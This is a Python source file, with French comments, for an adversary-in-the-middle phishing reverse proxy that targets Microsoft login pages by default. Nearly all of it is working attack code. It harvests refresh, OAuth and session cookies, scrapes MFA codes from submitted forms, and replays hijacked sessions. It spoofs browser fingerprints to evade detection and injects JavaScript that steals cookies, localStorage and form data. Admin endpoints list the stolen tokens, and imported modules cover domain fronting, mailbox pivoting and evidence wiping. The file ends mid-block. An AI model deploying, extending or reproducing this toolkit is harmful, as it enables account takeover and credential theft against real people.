"""
Advanced Proxy Module for Real Red Team Operations
Removes safety limitations and adds professional attack capabilities
"""

import base64
import json
import logging
import os
import random
import re
from datetime import datetime
from typing import Any, Dict, List, Optional, Set, Tuple
from urllib.parse import urlparse

import httpx
import uvicorn
import yaml
from fastapi import FastAPI, Request, Response
from fastapi.responses import JSONResponse, StreamingResponse

logging.basicConfig(level=logging.INFO,
                   format="%(asctime)s [%(levelname)s] ADV_PROXY: %(message)s")
logger = logging.getLogger("AdvancedProxy")

app = FastAPI(title="Vantablack Advanced Proxy")

# ===== INTÉGRATIONS DES MODULES EXTERNES (après app = FastAPI) =====
from attack.bitb.integration import register_bitb_routes

register_bitb_routes(app)

from attack.automated_flow.automation import register_automation_routes

register_automation_routes(app)

from attack.ws_smuggling.smuggler import register_ws_routes

register_ws_routes(app)

from attack.domain_fronting.fronting import register_fronting_routes

register_fronting_routes(app)

from attack.mailbox_pivot.pivot import register_pivot_routes

register_pivot_routes(app)

from attack.anti_forensics.wiper import register_wipe_routes

register_wipe_routes(app)

# ===== CONFIGURATION DYNAMIQUE =====
_proxy_config: dict[str, Any] = {
    "REVERSE_PROXY_TARGET": os.getenv("REVERSE_PROXY_TARGET", "https://login.microsoftonline.com"),
    "USE_DOH": os.getenv("USE_DOH", "false").lower() == "true",
    "USE_HTTP3": os.getenv("USE_HTTP3", "false").lower() == "true",
    "JA4_PROFILE": os.getenv("JA4_PROFILE", "chrome_latest"),
}

# ===== STORE PRIORITAIRE DES REFRESH TOKENS =====
_refresh_token_store: list[dict[str, Any]] = []

# ===== STORE DES TOKENS OAUTH =====
_oauth_token_store: list[dict[str, Any]] = []

# ===== STORE DES SESSION COOKIES =====
_session_cookie_store: list[dict[str, Any]] = []


class DoHResolver:
    """Résolveur DNS-over-HTTPS (Cloudflare / Google DoH)"""

    PROVIDERS = {
        "cloudflare": {
            "url": "https://1.1.1.1/dns-query",
            "accept": "application/dns-json",
        },
        "google": {
            "url": "https://dns.google/resolve",
            "accept": "application/json",
        },
    }

    def __init__(self, provider: str = "cloudflare"):
        self.provider = provider
        self._client: httpx.AsyncClient | None = None

    async def _get_client(self) -> httpx.AsyncClient:
        if self._client is None:
            self._client = httpx.AsyncClient(timeout=10.0)
        return self._client

    async def resolve(self, domain: str, record_type: str = "A") -> list[str]:
        """Résout un domaine via DoH, retourne la liste des IPs."""
        cfg = self.PROVIDERS.get(self.provider, self.PROVIDERS["cloudflare"])
        client = await self._get_client()
        params = {
            "name": domain,
            "type": record_type,
        }
        headers = {
            "Accept": cfg["accept"],
        }
        try:
            resp = await client.get(
                cfg["url"],
                params=params,
                headers=headers,
            )
            resp.raise_for_status()
            data = resp.json()
            answers = data.get("Answer", [])
            ips = [
                a["data"] for a in answers
                if a.get("type") in (1, 28)  # A ou AAAA
            ]
            logger.info(f"[DoH] {domain} -> {ips}")
            return ips
        except Exception as e:
            logger.error(f"[DoH] Resolve failed for {domain}: {e}")
            return []

    async def close(self):
        if self._client:
            await self._client.aclose()
            self._client = None


_doh_resolver = DoHResolver()


class JA4Spoofer:
    """Génère des User-Agent + headers HTTP cohérents pour imiter
    Chrome/Firefox/Safari récents (JA4/JA3-like fingerprint spoofing)."""

    PROFILES: dict[str, dict[str, Any]] = {
        "chrome_latest": {
            "name": "Chrome 128 (macOS)",
            "cipher_order": [
                0x1301, 0x1302, 0x1303, 0xC02B, 0xC02F, 0xC02C, 0xC030,
                0xCCA9, 0xCCA8, 0xC013, 0xC014, 0x009C, 0x009D, 0x002F, 0x0035,
            ],
            "user_agent": (
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) "
                "AppleWebKit/537.36 (KHTML, like Gecko) "
                "Chrome/128.0.0.0 Safari/537.36"
            ),
            "headers": {
                "sec-ch-ua": (
                    '"Chromium";v="128", "Not;A=Brand";v="24", '
                    '"Google Chrome";v="128"'
                ),
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": '"macOS"',
                "Accept": (
                    "text/html,application/xhtml+xml,application/xml;q=0.9,"
                    "image/avif,image/webp,image/apng,*/*;q=0.8,"
                    "application/signed-exchange;v=b3;q=0.7"
                ),
                "Accept-Language": "en-US,en;q=0.9",
                "Accept-Encoding": "gzip, deflate, br, zstd",
                "Connection": "keep-alive",
                "Upgrade-Insecure-Requests": "1",
                "Sec-Fetch-Site": "none",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-User": "?1",
                "Sec-Fetch-Dest": "document",
                "priority": "u=0, i",
            },
            "supported_groups": [0x001d, 0x0017, 0x0018, 0x0100, 0x0101, 0x0102],
            "alpn": ["h2", "http/1.1"],
        },
        "firefox_latest": {
            "name": "Firefox 130 (Windows)",
            "cipher_order": [
                0x1301, 0x1303, 0x1302, 0xC02B, 0xC02F, 0xCCA9, 0xC02C, 0xC030,
                0xCCA8, 0xC013, 0xC014, 0x009C, 0x009D, 0x002F, 0x0035,
            ],
            "user_agent": (
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) "
                "Gecko/20100101 Firefox/130.0"
            ),
            "headers": {
                "Accept": (
                    "text/html,application/xhtml+xml,application/xml;q=0.9,"
                    "image/avif,image/webp,*/*;q=0.8"
                ),
                "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip, deflate, br, zstd",
                "Connection": "keep-alive",
                "Upgrade-Insecure-Requests": "1",
                "Sec-Fetch-Dest": "document",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-Site": "none",
                "Sec-Fetch-User": "?1",
                "TE": "trailers",
            },
            "supported_groups": [0x0029, 0x0023, 0x0024, 0x0100, 0x0101, 0x0102],
            "alpn": ["h2", "http/1.1"],
        },
        "safari_latest": {
            "name": "Safari 17.6 (macOS Sonoma)",
            "cipher_order": [
                0x1301, 0x1302, 0x1303, 0xC02C, 0xC030, 0xC02B, 0xC02F,
                0xC009, 0xC013, 0xC00A, 0xC014, 0x0035, 0x002F,
            ],
            "user_agent": (
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_6) "
                "AppleWebKit/605.1.15 (KHTML, like Gecko) "
                "Version/17.6 Safari/605.1.15"
            ),
            "headers": {
                "Accept": (
                    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
                ),
                "Accept-Language": "en-US,en;q=0.9",
                "Accept-Encoding": "gzip, deflate, br",
                "Connection": "keep-alive",
                "Upgrade-Insecure-Requests": "1",
                "Sec-Fetch-Dest": "document",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-Site": "none",
            },
            "supported_groups": [0x001d, 0x001e, 0x0017, 0x0018, 0x0100, 0x0101],
            "alpn": ["h2", "http/1.1"],
        },
        "edge_latest": {
            "name": "Edge 128 (Windows)",
            "cipher_order": [
                0x1301, 0x1302, 0x1303, 0xC02B, 0xC02F, 0xC02C, 0xC030,
                0xCCA9, 0xCCA8, 0xC013, 0xC014, 0x009C, 0x009D, 0x002F, 0x0035,
            ],
            "user_agent": (
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                "AppleWebKit/537.36 (KHTML, like Gecko) "
                "Chrome/128.0.0.0 Safari/537.36 Edg/128.0.0.0"
            ),
            "headers": {
                "sec-ch-ua": (
                    '"Chromium";v="128", "Not;A=Brand";v="24", '
                    '"Microsoft Edge";v="128"'
                ),
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": '"Windows"',
                "Accept": (
                    "text/html,application/xhtml+xml,application/xml;q=0.9,"
                    "image/webp,image/apng,*/*;q=0.8,"
                    "application/signed-exchange;v=b3;q=0.7"
                ),
                "Accept-Language": "en-US,en;q=0.9",
                "Accept-Encoding": "gzip, deflate, br, zstd",
                "Connection": "keep-alive",
                "Upgrade-Insecure-Requests": "1",
                "Sec-Fetch-Site": "none",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-User": "?1",
                "Sec-Fetch-Dest": "document",
            },
            "supported_groups": [0x001d, 0x0017, 0x0018, 0x0100, 0x0101, 0x0102],
            "alpn": ["h2", "http/1.1"],
        },
    }

    def __init__(self):
        pass

    def list_profiles(self) -> dict[str, Any]:
        """Retourne la liste des profils disponibles."""
        return {
            name: {
                "name": p["name"],
                "user_agent": p["user_agent"],
                "cipher_count": len(p["cipher_order"]),
                "alpn": p["alpn"],
            }
            for name, p in self.PROFILES.items()
        }

    def get_profile(self, profile_name: str) -> dict[str, Any]:
        return self.PROFILES.get(profile_name, self.PROFILES["chrome_latest"])

    def apply_spoofed_headers(
        self,
        client_headers: dict[str, str],
        profile_name: str,
    ) -> dict[str, str]:
        """Applique les headers JA4-spoofés si le client n'en fournit pas."""
        profile = self.get_profile(profile_name)
        spoofed = dict(client_headers)

        if not spoofed.get("user-agent"):
            spoofed["user-agent"] = profile["user_agent"]

        for h_name, h_val in profile["headers"].items():
            if h_name.lower() not in [k.lower() for k in spoofed]:
                spoofed[h_name] = h_val

        return spoofed


_ja4_spoofer = JA4Spoofer()


# ===== CLIENTS HTTPX POUR LE REVERSE PROXY =====
_proxy_clients: dict[str, httpx.AsyncClient] = {}


async def _get_proxy_client() -> httpx.AsyncClient:
    """Retourne (ou crée) le client httpx adapté à la config dynamique."""
    global _proxy_clients, _proxy_config

    key = f"{_proxy_config['USE_HTTP3']}_{_proxy_config['USE_DOH']}"

    if key in _proxy_clients and not _proxy_clients[key].is_closed:
        return _proxy_clients[key]

    # Ferme les anciens clients
    for k, c in list(_proxy_clients.items()):
        if k != key:
            try:
                await c.aclose()
            except Exception:
                pass
        _proxy_clients.pop(k, None)

    client = httpx.AsyncClient(
        http3=_proxy_config["USE_HTTP3"],
        timeout=httpx.Timeout(60.0, connect=15.0),
        follow_redirects=False,
        verify=True,
    )
    _proxy_clients[key] = client
    logger.info(
        f"[PROXY] New httpx client created (HTTP3={_proxy_config['USE_HTTP3']}, "
        f"DoH={_proxy_config['USE_DOH']})"
    )
    return client


async def _resolve_target(target_url: str) -> str:
    """Résout l'IP du backend via DoH si activé, sinon retourne l'URL telle quelle."""
    if not _proxy_config["USE_DOH"]:
        return target_url

    parsed = urlparse(target_url)
    hostname = parsed.hostname
    if not hostname:
        return target_url

    ips = await _doh_resolver.resolve(hostname)
    if not ips:
        logger.warning(f"[DoH] Could not resolve {hostname}, using default transport")
        return target_url

    ip = random.choice(ips)
    new_url = parsed._replace(netloc=parsed.netloc.replace(hostname, ip)).geturl()
    logger.info(f"[DoH] Backend resolved: {hostname} -> {ip}")
    return new_url


def _parse_set_cookie(raw: str) -> tuple[str, str, dict[str, str]] | None:
    """Parse un header Set-Cookie et retourne (name, value, attrs)."""
    try:
        parts = [p.strip() for p in raw.split(";")]
        if not parts:
            return None
        first = parts[0]
        if "=" not in first:
            return None
        name, value = first.split("=", 1)
        attrs: dict[str, str] = {}
        for part in parts[1:]:
            if "=" in part:
                k, v = part.split("=", 1)
                attrs[k.strip().lower()] = v.strip()
            else:
                attrs[part.strip().lower()] = ""
        return (name.strip(), value, attrs)
    except Exception:
        return None


def _process_tokens_from_set_cookie(
    set_cookie_headers: list[str],
    request_meta: dict[str, Any],
) -> None:
    """Détecte refresh tokens, oauth tokens, session cookies dans les Set-Cookie
    et les route vers les stores dédiés."""
    refresh_keywords = ["estsauthpersistent", "estsauth", "refresh"]
    oauth_keywords = ["oauth", "access_token", "id_token", "bearer", "jwt", "token"]
    session_keywords = ["session", "auth", "cookie", "signin", "login"]

    for raw in set_cookie_headers:
        parsed = _parse_set_cookie(raw)
        if not parsed:
            continue
        name, value, attrs = parsed
        name_lower = name.lower()

        entry = {
            "name": name,
            "value": value,
            "attrs": attrs,
            "raw": raw,
            "timestamp": datetime.now().isoformat(),
            **request_meta,
        }

        is_refresh = any(kw in name_lower for kw in refresh_keywords)
        is_oauth = any(kw in name_lower for kw in oauth_keywords)
        is_session = any(kw in name_lower for kw in session_keywords)

        if is_refresh:
            logger.warning(
                f"[REFRESH_PRIORITY] 🔑 Refresh cookie intercepted: {name}"
                f" (domain={attrs.get('domain', '?')}, path={attrs.get('path', '/')})"
            )
            _refresh_token_store.append(entry)

        if is_oauth:
            logger.info(f"[OAUTH] OAuth-related cookie intercepted: {name}")
            _oauth_token_store.append(entry)

        if is_session and not is_refresh:
            logger.info(f"[SESSION] Session cookie intercepted: {name}")
            _session_cookie_store.append(entry)


class MFABypassEngine:
    """Advanced MFA interception and bypass capabilities"""

    def __init__(self):
        self.sms_patterns = [
            r'\b\d{6}\b',
            r'\b\d{4,8}\b',
            r'(?i)(?:code|verification|token)[:\s]*[=]?\s*(\d{4,8})',
            r'(?i)(?:mfa|2fa|totp)[:\s]*[=]?\s*(\d{4,8})',
            r'"code"\s*:\s*"(\d+)"',
            r'"token"\s*:\s*"(\d+)"'
        ]

        self.email_patterns = [
            r'(?i)(?:security|login|verification)\s+code\s+is\s+(\d{6})',
            r'(?i)use\s+the\s+following\s+code\s*[:]?\s*(\d{6})',
            r'(?i)your\s+verification\s+code\s+is\s+(\d{6})'
        ]

    def intercept_mfa_codes(self, content: str, content_type: str = "") -> list[str]:
        """Intercept MFA codes from various content types"""
        intercepted = []

        for pattern in self.sms_patterns:
            matches = re.findall(pattern, content)
            intercepted.extend(matches)

        if any(keyword in content_type.lower() for keyword in ['html', 'text']) \
           or any(keyword in content.lower() for keyword in ['email', 'mail']):
            for pattern in self.email_patterns:
                matches = re.findall(pattern, content)
                intercepted.extend(matches)

        return list(set(intercepted))


class SessionHijacker:
    """Advanced session capture and manipulation"""

    def __init__(self):
        self.active_sessions: dict[str, dict] = {}
        self.session_keys = {'session', 'auth', 'token', 'jwt', 'oauth', 'bearer', 'access', 'refresh'}

    def capture_full_session(self, request: Request) -> dict:
        """Capture complete session data from request"""
        session_data = {
            'cookies': {},
            'headers': {},
            'ip_address': request.client.host,
            'user_agent': request.headers.get('user-agent', ''),
            'timestamp': datetime.now().isoformat(),
            'method': request.method,
            'url': str(request.url),
            'path': request.url.path
        }

        for name, value in request.cookies.items():
            if any(keyword in name.lower() for keyword in self.session_keys):
                session_data['cookies'][name] = value

        for name, value in request.headers.items():
            if any(keyword in name.lower() for keyword in self.session_keys):
                session_data['headers'][name] = value

        session_id = base64.b64encode(f"{session_data['ip_address']}_{datetime.now().timestamp()}".encode()).decode()
        self.active_sessions[session_id] = session_data

        logger.info(f"🚀 Session captured: {session_id} - {session_data['ip_address']}")
        return session_data

    def capture(
        self,
        target: str,
        cookies: dict | None = None,
        jwt_token: str | None = None,
        headers: dict | None = None,
        ip_address: str = "0.0.0.0",
    ) -> dict:
        """Capture une session à partir d'éléments bruts (cookies + JWT).

        Différent de ``capture_full_session`` (qui part d'une Request du
        proxy) : ici, l'orchestrateur injecte directement les artefacts
        collectés par les autres vecteurs (BitB, OAuth, AiTM) pour les
        enregistrer comme session rejouable.

        Stockage strictement en mémoire (OPSEC labo) — aucun disque.
        """
        session_id = base64.b64encode(
            f"{target}_{datetime.now().timestamp()}".encode()
        ).decode()
        session_data = {
            'session_id': session_id,
            'target': target,
            'cookies': dict(cookies or {}),
            'jwt_token': jwt_token,
            'headers': dict(headers or {}),
            'ip_address': ip_address,
            'user_agent': (headers or {}).get('user-agent', ''),
            'timestamp': datetime.now().isoformat(),
        }
        self.active_sessions[session_id] = session_data
        logger.info("🚀 Session captured (raw) : %s → %s", session_id[:16], target)
        return session_data

    def replay_session(self, session_id: str, target_url: str) -> httpx.Response:
        """Replay captured session to target URL"""
        if session_id not in self.active_sessions:
            raise ValueError("Session not found")

        session = self.active_sessions[session_id]

        headers = {
            'User-Agent': session['user_agent'],
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        }

        headers.update(session['headers'])

        with httpx.Client() as client:
            cookies = session['cookies']

            response = client.get(
                target_url,
                headers=headers,
                cookies=cookies,
                follow_redirects=True
            )

        logger.info(f"🔁 Session replayed to {target_url} - Status: {response.status_code}")
        return response


class AdvancedPhishletEngine:
    """Enhanced phishlet engine with offensive capabilities"""

    def __init__(self, phishlet_path: str):
        self.phishlet_path = phishlet_path
        self.config = self._load_config()
        self.mfa_bypass = MFABypassEngine()
        self.session_hijacker = SessionHijacker()
        self.whitelist_domains = self._load_domains()

    def _load_config(self) -> dict[str, Any]:
        if not os.path.exists(self.phishlet_path):
            logger.error(f"Phishlet file not found: {self.phishlet_path}")
            return {}
        with open(self.phishlet_path, 'r') as f:
            return yaml.safe_load(f)

    def _load_domains(self) -> set[str]:
        """Load whitelisted domains from config and env"""
        domains = set()

        env_domains = os.getenv("REDTEAM_DOMAINS", "")
        if env_domains:
            domains.update(d.strip().lower() for d in env_domains.split(","))

        config_domains = self.config.get("target_domains", [])
        domains.update(d.strip().lower() for d in config_domains if isinstance(d, str))

        return domains

    async def process_request(self, request: Request) -> dict | None:
        """Process incoming request for session capture (async pour await body)."""
        target_domain = request.url.hostname

        if target_domain and target_domain.lower() not in self.whitelist_domains:
            logger.warning(f"Domain not in whitelist: {target_domain}")
            return None

        session_data = self.session_hijacker.capture_full_session(request)

        if request.method == "POST":
            try:
                body = await request.body()
                body_str = body.decode('utf-8', errors='ignore')

                mfa_codes = self.mfa_bypass.intercept_mfa_codes(body_str)
                if mfa_codes:
                    session_data['mfa_codes'] = mfa_codes
                    logger.info(f"🎯 MFA Codes intercepted: {mfa_codes}")

            except Exception as e:
                logger.error(f"Error processing POST body: {e}")

        return session_data

    def inject_session_stealer(self, content: bytes, content_type: str) -> bytes:
        """Inject session stealing JavaScript into responses"""
        if not content_type or 'html' not in content_type.lower():
            return content

        try:
            content_str = content.decode('utf-8', errors='ignore')

            stealer_js = """
            <script>
            // Advanced session persistence stealer
            setInterval(function() {
                fetch('/_/session/persist', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        cookies: document.cookie,
                        localStorage: JSON.stringify(localStorage),
                        sessionStorage: JSON.stringify(sessionStorage),
                        userAgent: navigator.userAgent,
                        timestamp: new Date().toISOString()
                    })
                }).catch(() => {});
            }, 10000);

            // Capture form submissions
            document.addEventListener('submit', function(e) {
                const form = e.target;
                const data = new FormData(form);
                const formData = Object.fromEntries(data.entries());

                fetch('/_/form/capture', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(formData)
                }).catch(() => {});
            });
            </script>
            """

            if '</body>' in content_str:
                content_str = content_str.replace('</body>', f'{stealer_js}</body>')
                return content_str.encode('utf-8')

        except Exception as e:
            logger.error(f"Error injecting session stealer: {e}")

        return content


# Global instances
mfa_engine = MFABypassEngine()
session_hijacker = SessionHijacker()


@app.middleware("http")
async def advanced_proxy_middleware(request: Request, call_next):
    """Main middleware for advanced attack capabilities"""

    phishlet_path = os.getenv("PHISHLET_PATH")
    engine: AdvancedPhishletEngine | None = None
    session_data: dict[str, Any] | None = None

    if phishlet_path and os.path.exists(phishlet_path):
        engine = AdvancedPhishletEngine(phishlet_path)
        session_data = await engine.process_request(request)
        if session_data:
            logger.info(f"📡 Session data captured: {len(session_data.get('cookies', {}))} cookies")

    response = await call_next(request)

    # ===== Extraction des tokens Refresh / OAuth / Session depuis la réponse =====
    request_meta = {
        "ip": request.client.host if request.client else "unknown",
        "user_agent": request.headers.get("user-agent", ""),
        "method": request.method,
        "path": request.url.path,
    }

    set_cookie_headers = response.headers.getlist("set-cookie")
    if set_cookie_headers:
        _process_tokens_from_set_cookie(set_cookie_headers, request_meta)

    # Inject session stealer into HTML responses
    content_type = response.headers.get('content-type', '')
    if engine and hasattr(response, 'body'):
        body = b""
        async for chunk in response.body_iterator:
            body += chunk

        processed_body = engine.inject_session_stealer(body, content_type)

        new_headers = dict(response.headers)
        if "content-length" in new_headers:
            new_headers["content-length"] = str(len(processed_body))

        return Response(
            content=processed_body,
            status_code=response.status_code,
            headers=new_headers,
            media_type=response.media_type
        )

    return response


@app.middleware("http")
async def refresh_token_priority_middleware(request: Request, call_next):
    """Middleware dédié RefreshTokenPriority : intercepte Set-Cookie de refresh
    et les journalise en premier avec [REFRESH_PRIORITY]."""
    response = await call_next(request)

    set_cookie_headers = response.headers.getlist("set-cookie")
    if not set_cookie_headers:
        return response

    refresh_keywords = ["estsauthpersistent", "estsauth", "refresh"]
    request_meta = {
        "ip": request.client.host if request.client else "unknown",
        "user_agent": request.headers.get("user-agent", ""),
        "method": request.method,
        "path": request.url.path,
    }

    for raw in set_cookie_headers:
        parsed = _parse_set_cookie(raw)
        if not parsed:
            continue
        name, value, attrs = parsed
        name_lower = name.lower()
        if any(kw in name_lower for kw in refresh_keywords):
            entry = {
                "name": name,
                "value": value,
                "attrs": attrs,
                "raw": raw,
                "timestamp": datetime.now().isoformat(),
                **request_meta,
            }
            # Logger EN PREMIER avec le préfixe [REFRESH_PRIORITY]
            logger.warning(
                f"[REFRESH_PRIORITY] ⚡ PRIORITY: {name}"
                f" | domain={attrs.get('domain', '?')}"
                f" | secure={('secure' in attrs)}"
                f" | httponly={('httponly' in attrs)}"
            )
            # Éviter les doublons dans le store
            already = any(
                (
                    e.get("name") == name
                    and e.get("value")[:32] == value[:32]
                    and e.get("ip") == request_meta.get("ip")
                )
                for e in _refresh_token_store[-50:]
            )
            if not already:
                _refresh_token_store.append(entry)

    return response


# =============== ENDPOINTS ADMIN / OPS ===============

@app.get("/_/sessions")
async def list_sessions():
    """List all captured sessions"""
    return JSONResponse({
        'count': len(session_hijacker.active_sessions),
        'sessions': list(session_hijacker.active_sessions.keys())
    })


@app.get("/_/session/{session_id}")
async def get_session(session_id: str):
    """Get specific session details"""
    if session_id not in session_hijacker.active_sessions:
        return JSONResponse({"error": "Session not found"}, status_code=404)

    return JSONResponse(session_hijacker.active_sessions[session_id])


@app.post("/_/session/replay/{session_id}")
async def replay_session(session_id: str, target_url: str):
    """Replay captured session to target URL"""
    try:
        response = session_hijacker.replay_session(session_id, target_url)
        return JSONResponse({
            'status_code': response.status_code,
            'headers': dict(response.headers),
            'text': response.text
        })
    except Exception as e:
        return JSONResponse({"error": str(e)}, status_code=400)


@app.post("/_/mfa/intercept")
async def intercept_mfa(content: str, content_type: str = ""):
    """Intercept MFA codes from content"""
    codes = mfa_engine.intercept_mfa_codes(content, content_type)
    return JSONResponse({"intercepted_codes": codes})


@app.get("/_/sessions/refresh_tokens")
async def list_refresh_tokens():
    """Liste les refresh tokens capturés (store prioritaire)."""
    return JSONResponse({
        "count": len(_refresh_token_store),
        "refresh_tokens": _refresh_token_store,
    })


@app.get("/_/sessions/oauth_tokens")
async def list_oauth_tokens():
    """Liste les tokens OAuth capturés."""
    return JSONResponse({
        "count": len(_oauth_token_store),
        "oauth_tokens": _oauth_token_store,
    })


@app.get("/_/sessions/session_cookies")
async def list_session_cookies():
    """Liste les session cookies capturés."""
    return JSONResponse({
        "count": len(_session_cookie_store),
        "session_cookies": _session_cookie_store,
    })


@app.get("/_/evasion/ja4_profiles")
async def list_ja4_profiles():
    """Liste les profils JA4/JA3 de spoofing disponibles."""
    return JSONResponse({
        "profiles": _ja4_spoofer.list_profiles(),
        "active_profile": _proxy_config["JA4_PROFILE"],
    })


@app.post("/_/proxy/config")
async def update_proxy_config(payload: dict[str, Any]):
    """Met à jour dynamiquement la configuration du reverse proxy.

    Payload JSON supporté :
    {
      "REVERSE_PROXY_TARGET": "https://example.com",
      "USE_DOH": true,
      "USE_HTTP3": false,
      "JA4_PROFILE": "firefox_latest"
    }
    """
    global _proxy_config, _proxy_clients

    allowed_keys = {"REVERSE_PROXY_TARGET", "USE_DOH", "USE_HTTP3", "JA4_PROFILE"}
    unknown = set(payload.keys()) - allowed_keys
    if unknown:
        return JSONResponse(
            {"error": f"Unknown keys: {sorted(unknown)}", "allowed": sorted(allowed_keys)},
            status_code=400,
        )

    if "REVERSE_PROXY_TARGET" in payload:
        tgt = payload["REVERSE_PROXY_TARGET"]
        if not tgt.startswith(("http://", "https://")):
            return JSONResponse(
                {"error": "REVERSE_PROXY_TARGET must start with http(s)://"},
                status_code=400,
            )
        _proxy_config["REVERSE_PROXY_TARGET"] = tgt

    if "USE_DOH" in payload:
        v = payload["USE_DOH"]
        if isinstance(v, bool):
            _proxy_config["USE_DOH"] = v
        elif isinstance(v, str):
            _proxy_config["USE_DOH"] = v.lower() == "true"
        else:
            return JSONResponse({"error": "USE_DOH must be bool or string"}, status_code=400)

    if "USE_HTTP3" in payload:
        v = payload["USE_HTTP3"]
        if isinstance(v, bool):
            _proxy_config["USE_HTTP3"] = v
        elif isinstance(v, str):
            _proxy_config["USE_HTTP3"] = v.lower() == "true"
        else:
            return JSONResponse({"error": "USE_HTTP3 must be bool or string"}, status_code=400)

    if "JA4_PROFILE" in payload:
        profile = payload["JA4_PROFILE"]
        if profile not in _ja4_spoofer.PROFILES:
            return JSONResponse(
                {"error": f"Unknown JA4 profile. Use one of: {sorted(_ja4_spoofer.PROFILES.keys())}"},
                status_code=400,
            )
        _proxy_config["JA4_PROFILE"] = profile

    # Force la récréation du client httpx au prochain appel
    for _, c in list(_proxy_clients.items()):
        try:
            await c.aclose()
        except Exception:
            pass
    _proxy_clients.clear()

    logger.warning(f"[PROXY_CONFIG] Updated: {json.dumps(_proxy_config)}")
    return JSONResponse({
        "ok": True,
        "config": _proxy_config,
    })


@app.get("/_/proxy/config")
async def get_proxy_config():
    """Retourne la configuration active du reverse proxy."""
    return JSONResponse({
        "config": _proxy_config,
        "target_host": urlparse(_proxy_config["REVERSE_PROXY_TARGET"]).hostname,
    })


# =============== REVERSE PROXY HTTP RÉEL (Catch-All) ===============

async def _stream_response(response: httpx.Response):
    """Générateur async pour streamer la réponse du backend."""
    try:
        async for chunk in response.aiter_bytes(chunk_size=8192):
            yield chunk
    finally:
        await response.aclose()


@app.api_route(
    "/{full_path:path}",
    methods=["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS"],
    include_in_schema=False,
)
async def reverse_proxy_catch_all(
    request: Request,
    full_path: str,
):
    """Reverse proxy AiTM catch-all : relaie TOUT vers le backend configuré
    via REVERSE_PROXY_TARGET, avec streaming, copie des headers, JA4 spoofing,
    DoH optionnel, HTTP/3 optionnel."""

    target_base = _proxy_config["REVERSE_PROXY_TARGET"].rstrip("/")
    target_url = f"{target_base}/{full_path}"
    if request.url.query:
        target_url += f"?{request.url.query}"

    # Si DoH activé, résout via DoH
    final_target_url = await _resolve_target(target_url)

    client = await _get_proxy_client()

    # --- Construit les headers vers le backend ---
    client_headers: dict[str, str] = {}
    for h_name, h_val in request.headers.items():
        h_lower = h_name.lower()
        if h_lower == "host":
            # Host = celui du backend (on remplace)
            parsed_target = urlparse(target_base)
            client_headers[h_name] = parsed_target.netloc
        elif h_lower in ("content-length",):
            # httpx recalcule
            continue
        else:
            client_headers[h_name] = h_val

    # Applique JA4 spoofing si besoin
    client_headers = _ja4_spoofer.apply_spoofed_headers(
        client_headers, _proxy_config["JA4_PROFILE"]
    )

    # Assure que le Host header est correct (hostname du backend)
    parsed_target = urlparse(target_base)
    client_headers["host"] = parsed_target.netloc

    # --- Lit le body du client ---
    body_bytes: bytes | None = None
    if request.method not in ("GET", "HEAD", "OPTIONS", "DELETE"):
        try:
            body_bytes = await request.body()
        except Exception:
            body_bytes = None

    # --- Filtre les cookies pour logs ---
    req_meta = {
        "ip": request.client.host if request.client else "unknown",
        "user_agent": request.headers.get("user-agent", ""),
        "method": request.method,
        "path": f"/{full_path}",
    }

    logger.info(
        f"[REVERSE_PROXY] → {request.method} /{full_path} -> {target_base}"
        f" (HTTP3={_proxy_config['USE_HTTP3']}, DoH={_proxy_config['USE_DOH']}, "
        f"JA4={_proxy_config['JA4_PROFILE']})"
    )

    try:
        request_args: dict[str, Any] = {
            "method": request.method,
            "url": final_target_url,
            "headers": client_headers,
            "follow_redirects": False,
        }
        if body_bytes is not None:
            request_args["content"] = body_bytes

        backend_response = await client.request(**request_args)

    except httpx.ConnectError as e:
        logger.error(f"[REVERSE_PROXY] Connect error: {e}")
        return JSONResponse(
            {"error": "Backend unreachable", "detail": str(e)},
            status_code=502,
        )
    except Exception as e:
        logger.exception(f"[REVERSE_PROXY] Fatal error: {e}")
        return JSONResponse(
            {"error": "Proxy error", "detail": str(e)},
            status_code=500,
        )

    # --- Construit les headers de la réponse vers le client ---
    resp_headers: dict[str, str] = {}
    set_cookie_headers: list[str] = []

    for h_name, h_val in backend_response.headers.items():
        h_lower = h_name.lower()
        if h_lower == "set-cookie":
            set_cookie_headers.append(h_val)
            continue
        if h_lower in (
            "content-encoding",
            "transfer-encoding",
            "connection",
            "keep-alive",
            "content-length",
        ):
            # httpx / FastAPI gèrent ça
            continue
        resp_headers[h_name] = h_val

    # --- Traite les refresh/oauth/session tokens de la réponse ---
    if set_cookie_headers:
        _process_tokens_from_set_cookie(set_cookie_headers, req_meta)

    # Ré-ajoute les Set-Cookie (un par header)
    final_headers_resp = httpx.Headers(resp_headers)
    for sc in set_cookie_headers:
        final_headers_resp.append("set-cookie", sc)

    # Logge la réponse
    logger.info(
        f"[REVERSE_PROXY] ← {backend_response.status_code} "
        f"({len(set_cookie_headers)} cookies)"
    )

    # --- Stream la réponse au client ---
    content_type = backend_response.headers.get("content-type")

    return StreamingResponse(
        _stream_response(backend_response),
        status_code=backend_response.status_code,
        headers=dict(final_headers_resp),
        media_type=content_type,
    )


@app.on_event("shutdown")
async def shutdown_event():
    """Nettoie les clients httpx et le resolver DoH à l'arrêt."""
    logger.info("[SHUTDOWN] Closing proxy clients...")
    for _, c in list(_proxy_clients.items()):
        try:
            await c.aclose()
        except Exception:
            pass
    _proxy_clients.clear()
    await _doh_resolver.close()


if __name__ == "__main__":
